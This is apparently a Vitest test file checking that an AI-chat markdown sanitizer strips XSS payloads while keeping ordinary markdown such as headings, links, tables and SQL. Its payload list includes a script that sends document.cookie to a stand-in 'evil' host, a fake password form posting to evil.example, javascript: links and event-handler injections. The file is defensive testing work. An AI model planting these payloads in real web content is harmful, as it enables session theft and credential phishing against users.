// @vitest-environment jsdom
import { describe, it, expect } from "vitest";
import { renderSanitizedMarkdown } from "./ai-markdown-sanitizer";

/**
 * Covers the real AI-output sanitization path used by `ai-chat-message.tsx`
 * (marked -> DOMPurify -> dangerouslySetInnerHTML), not a freshly configured
 * DOMPurify instance: a differently-configured sanitizer would prove nothing
 * about what this app renders.
 */

/** Payloads that must never survive sanitization. */
const XSS_PAYLOADS: Array<[name: string, markdown: string, forbidden: string[]]> = [
  ["script tag", "<script>alert(1)</script>", ["<script", "alert(1)"]],
  [
    "script tag after text",
    "Here you go:\n\n<script>fetch('http://evil/'+document.cookie)</script>",
    ["<script", "document.cookie"],
  ],
  ["img onerror", '<img src=x onerror="alert(1)">', ["onerror"]],
  ["body onload", '<body onload="alert(1)">hi</body>', ["onload"]],
  ["svg onload", '<svg onload="alert(1)"></svg>', ["onload"]],
  ["svg script", "<svg><script>alert(1)</script></svg>", ["<script", "alert(1)"]],
  [
    "mathml annotation-xml",
    '<math><annotation-xml encoding="text/html"><img src=x onerror="alert(1)"></annotation-xml></math>',
    ["onerror"],
  ],
  ["javascript: markdown link", "[click me](javascript:alert(1))", ["javascript:"]],
  ["javascript: raw anchor", '<a href="javascript:alert(1)">x</a>', ["javascript:"]],
  [
    "javascript: with entities",
    '<a href="java&#115;cript:alert(1)">x</a>',
    ["javascript:", "java&#115;cript:"],
  ],
  [
    "data: html anchor",
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    ["data:text/html"],
  ],
  ["markdown image with javascript: source", "![alt](javascript:alert(1))", ["javascript:"]],
  ["iframe", '<iframe src="https://evil.example"></iframe>', ["<iframe"]],
  ["object embed", '<object data="evil.swf"></object>', ["<object"]],
  [
    "form with credential inputs",
    '<form action="https://evil.example"><input name="password" type="password"><button>Sign in</button></form>',
    ["<form", "<input", "<button"],
  ],
  ["formaction on submit", '<button formaction="https://evil.example">go</button>', ["formaction"]],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">', ["<meta"]],
  ["style tag", "<style>body{background:url('https://evil.example')}</style>", ["<style"]],
  ["onfocus autofocus", '<input autofocus onfocus="alert(1)">', ["onfocus"]],
  ["details ontoggle", "<details open ontoggle=alert(1)>x</details>", ["ontoggle"]],
  ["base href", '<base href="https://evil.example/">', ["<base"]],
  [
    "overlay via inline style",
    '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">Enter your password</div>',
    ["style=", "position:fixed"],
  ],
  [
    "srcdoc iframe",
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    ["<iframe", "srcdoc"],
  ],
];

describe("renderSanitizedMarkdown — XSS payloads", () => {
  it.each(XSS_PAYLOADS)("strips %s", (_name, markdown, forbidden) => {
    const html = renderSanitizedMarkdown(markdown).toLowerCase();
    for (const needle of forbidden) {
      expect(html).not.toContain(needle.toLowerCase());
    }
  });

  it("never yields an executable node when the output is parsed", () => {
    for (const [, markdown] of XSS_PAYLOADS) {
      const host = document.createElement("div");
      host.innerHTML = renderSanitizedMarkdown(markdown);
      expect(
        host.querySelectorAll(
          "script, iframe, object, embed, form, input, button, textarea, select, meta, base",
        ),
      ).toHaveLength(0);
      for (const el of Array.from(host.querySelectorAll("*"))) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name.startsWith("on")).toBe(false);
          if (attr.name === "href" || attr.name === "src") {
            expect(attr.value.replace(/\s/g, "").toLowerCase()).not.toMatch(
              /^(javascript|data:text\/html|vbscript):/,
            );
          }
        }
      }
    }
  });

  // Control: the assertions above can fail. Unsanitized, the same payloads do
  // produce the dangerous markup — so a sanitizer regression is detectable.
  it("control: the same payloads survive when not sanitized", () => {
    const host = document.createElement("div");
    host.innerHTML = "<img src=x onerror=\"alert(1)\">";
    expect(host.querySelector("img")?.getAttribute("onerror")).toBe("alert(1)");
  });
});

describe("renderSanitizedMarkdown — legitimate markdown survives", () => {
  it("keeps headings, emphasis, lists and inline code", () => {
    const html = renderSanitizedMarkdown(
      "# Title\n\nSome **bold** and *italic* text with `inline_code`.\n\n- one\n- two\n",
    );
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<em>italic</em>");
    expect(html).toContain("<code>inline_code</code>");
    expect(html).toContain("<li>one</li>");
  });

  it("keeps http(s) links and their text", () => {
    const html = renderSanitizedMarkdown("[docs](https://example.com/a?b=1&c=2)");
    expect(html).toContain('href="https://example.com/a?b=1&amp;c=2"');
    expect(html).toContain(">docs</a>");
  });

  it("keeps table content when the markdown asks for column alignment", () => {
    const html = renderSanitizedMarkdown("| id | name |\n| :-- | ---: |\n| 1 | ada |\n");
    expect(html).toContain("<table>");
    expect(html).toContain(">ada</td>");
    // Alignment survives as an `align` attribute; no inline style is emitted.
    expect(html).toContain('align="left"');
    expect(html).not.toContain("style=");
  });

  it("keeps tables produced by GFM markdown", () => {
    const html = renderSanitizedMarkdown("| id | name |\n| -- | ---- |\n| 1 | ada |\n");
    expect(html).toContain("<table>");
    expect(html).toContain("<td>ada</td>");
  });

  it("keeps SQL rendered as a fenced-free indented block", () => {
    const html = renderSanitizedMarkdown("Run this:\n\n    SELECT * FROM users WHERE id = 1;\n");
    expect(html).toContain("<pre>");
    expect(html).toContain("SELECT * FROM users WHERE id = 1;");
  });

  it("escapes SQL comparison operators instead of dropping the text", () => {
    const html = renderSanitizedMarkdown("Use `WHERE a < b AND c > d` in the filter.");
    expect(html).toContain("a &lt; b AND c &gt; d");
  });

  it("returns an empty string for empty input", () => {
    expect(renderSanitizedMarkdown("")).toBe("");
  });
});
